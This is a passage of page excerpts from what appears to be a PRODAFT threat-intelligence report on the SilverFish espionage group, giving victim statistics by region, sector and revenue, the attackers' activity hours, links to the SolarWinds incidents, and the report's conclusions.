It is apparent from this graph that the SilverFish group\ncarried out their operation over three time periods.\n\n**Figure 38. Victim infection count vs date graph**\n\nThe term ”First Wave” will be used solely when referring to the period that starts with the\nend of August 20’ and ends with the beginning of November 20’. During this period of\nattack, threat actors mostly infected enterprise companies and government entities in\nthe US. Subsequently, there was a serious decrease in the number of victims between\nthe beginning of November 20’ and the end of the year. These results confirm the strong\ncorrelation between the SolarWinds attacks and the SilverFish group based on the trend\ndata published by Cloudflare [2] Notwithstanding the key domain of the SolarWinds attack\nwas seized and sinkholed, the attackers seem to have resumed their operations with the\nstart of the new year. Infection activity and data exfiltration are expected to continue in\n2021.\n\n34 / 51\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698.

In accordance with\nthese findings, we can see that the\noverall attack target tends to be\nvery similar between the US and\nthe EU.\n\nWhile the US is by far the most\nfrequently-targeted region with\n2465 attacks recorded; there\nare 1,645 victims from several\nE.U. states including Italy, the\nNetherlands, Denmark, Austria,\nFrance and Great Britain. Even\nthough Canada and Mexico do\nnot have any governmental ties\nwith the E.U. or U.S.; we may say\nthat these countries are attacked\ndue to their close geographical /\npolitical relations with the United\nStates.\n\nIn terms of victim distribution, it is possible to see a very strong emphasis on governmental\ntargets. Among all 4720+ targets recorded by the PTI Team, 21.3% were detected to be\ngovernmental institutions. This was followed by the services industry, information technology,\neducation, defense and aviation. At first sight, it is possible that SilverFish is an APT that\ntargets major critical infrastructures. As can be seen from the figure in Example 29; nearly all\n**critical infrastructures (as defined in detail throughout NIST CyberSecurity Framework [14])**\nhave been explicitly targeted by SilverFish.\n\n35 / 51\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698.

Annual revenue distribution of the victims**\n\nWe believe that one of the most fundamental elements that make SilverFish special is the\nimportance of targeted organizations. Despite the fact that we are not at liberty to provide\nany target name to refrain from harming any organization’s reputation, we would like to\nemphasize the nature of chosen targets by providing approximations revenue distribution of\nvictim organizations in Figure 30. Please note that these figures are acquired from public\nrevenue statements of victim organizations and provided solely for enabling the reader to\ninterpret the corporate size of the victims in a clearer manner.\n\n36 / 51\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698.

Victim distribution by sector**\n\nThe sector distribution obtained from the preliminary analysis of victim data is presented in\nFigure 40. What stands out in the graph is that mostly government entities are affected by\nattacks carried out by the SilverFish group. Besides, 13.5% of the victims are working in the\nServices & Hospitality sector, Information Technology 11.3%, Education 9.2% and Defense &\nAviation 7.0%. This graph is quite revealing in several ways. First, unlike the other ransomware\nor malware campaigns, the SilverFish group predominantly targets critical entities like energy,\ndefense and government or Fortune500 enterprise companies. Second, the PTI Team found\nexplanatory comments in the C&C servers that clearly point to ignoring victims like Universities,\nsmall companies or systems which they consider worthless.\n\n37 / 51\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698.

Attacker activity time graph - All times are in UTC format**\n\nDuring this investigation, one of the most fascinating discoveries was discovering working\norder of threat actors. As can be seen in Figure 32 - Attacker Activity Time Graph; it is\npossible to see that SilverFish has operated in accordance with a specific timing pattern. In\ncompliance with the x-axis of Figure 30, it is possible to see that threat actors have been\nmostly active between the hours of 08:00 and 20:00, as if they were working according to\na specific shift. Very similarly, by referring to the y-axis of the same graph; it is possible to\nwitness that number of attacks tend to intensify during weekdays, with very few records\nduring weekends.\n\nAs also explained in the ”C&C Analysis” section of this report, we are aware of the fact\nthat SilverFish operates according to a specific duty allocation by means of teams that\ncooperate with each other via the C&C. When we take these findings into consideration;\nwe believe relevant authorities may make certain attributions to specific APT groups from\nexperience.\n\n39 / 51\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698.

First of all, we believe SilverFish\ncan be evaluated as a fundamental evidence for attributing SolarWinds incidents to multiple\ngroups with different motives.\n\nSecond, our research on the SilverFish is expected to act as a cornerstone for understanding\norganized cyber-crime better by shifting the perception of APT groups from highly talented\nsecurity experts to highly-organized crime network.\n\nFurthermore our findings on SilverFish demonstrate that security analysts should refrain from\nfully-automatizing their threat intelligence protocols as all SilverFish infrastructures had\nmultiple simultaneous IOCs that had been previously attributed to different groups and\ncampaigns such as Trickbot, EvilCorp, SolarWinds, WastedLocker, DarkHydrus, and many\nmore. It is our opinion that acting strictly upon receiving IOC intelligence from third-party\nresources may be one of the main reasons that prevent researchers from realizing the actual\nscope of large-scale APT attacks.\n\nAs also explained on multiple occasions throughout the report, we presume that there\nmay be ongoing operations that feature the same tools, tactics, and procedures to target\ndifferent regions for different motives. Therefore, it’s our opinion that SilverFish will be setting\nan important precedent for an extremely wide-scale covert cyber offense in terms of its\nstructure and operation.\n\nPer the aforesaid, we believe SilverFish is the first group that has targeted EU states by using\nthe vulnerabilities which were tied to the SolarWinds incident. Furthermore, we evaluate our\nresearch on the SilverFish group to be one of the first cases to have identified the objectives\nof SolarWinds actors (as SilverFish is expected to be one of many) clearly by means of\ntechnical findings. In this case, we assess this objective to be reconnaissance and covert\ndata exfiltration.\n\nAs the PTI team, we acknowledge the fact that our findings on SilverFish create as many\nquestions as it answers. Witnessing such a structured approach to covert cyber-espionage\nreminds us that cyber-warfare will continue to be the most technical component of Fifth\nDimension Operations. Unfortunately despite their importance, budget, and resources, very\nfew organizations take information security as seriously as adversaries like the SilverFish\ngroup.\n\nThis case demonstrates that current cyber crime operations are evolving significantly into a\nmuch more complex phenomenon, requiring timely corporation among LE agencies, CERTs,\nprivate sectors and communities. We have first-handedly experienced that, remedying\nimpact of such an attack with 4200+ targets is an extremely challenging task without\ncontribution and commitment of each party.\n\nFinally, we would like to present our deepest gratitude to our advisors, partners, the national\nCERT of Switzerland, and especially the cantonal police force of Vaud for their timely support\nand dedication.\n\n40 / 51\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698.

We devote our efforts\nto understanding future threats by analyzing current ones e.g., by attempting to ascertain\nthe level of sophistication of the attack, the motivation/purpose, how it was carried out, and\nmore. In all our interactions, we are guided by Swiss laws and regulations as well as basic\nprinciples of sound business ethics and integrity.\n\nBased on our initial analysis, the actor can be viewed as an entity possessing a high degree\nof sophistication and who goes beyond the necessary technical skills needed to conduct\nan operation of this magnitude. The actor demonstrates a comprehensive and up-to-date\nknowledge of exploitation practices, security architecture/protocols, and anonymization\ntechniques. More importantly, their knowledge transcends regional/cultural and linguistic\nbarriers.\n\nThe bulk of the attacks were carried out between the hours of 12:00 and 16:00 UTC with\nalmost no activity between 20:00 and 08:00 UTC. From our point of view, this illustrates the\nexistence of an organization that operates in an organized and disciplined manner in a\nhierarchical environment, one that is even highly compartmentalized.\n\nA wide range of targets fell victim to these attacks from large corporations (e.g., in\nhospitality/service, IT, and construction) to the education sector, manufacturing, and\ngovernment institutions. At this stage, we do not have a complete understanding of the clear\npurpose of these attacks other than those of the group’s previous operations. This means\nwe have yet to receive information about data exfiltration or the utilization of ransomware.\nRegardless, the attacker has clearly shown that they possess the motivation, willingness, and\ncapacity to plan and execute activities of this character and scale. Also, the attacker has\nshown that they operate with enough flexibility and available resources to strike when the\nopportunity arises.\n\n41 / 51\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698.
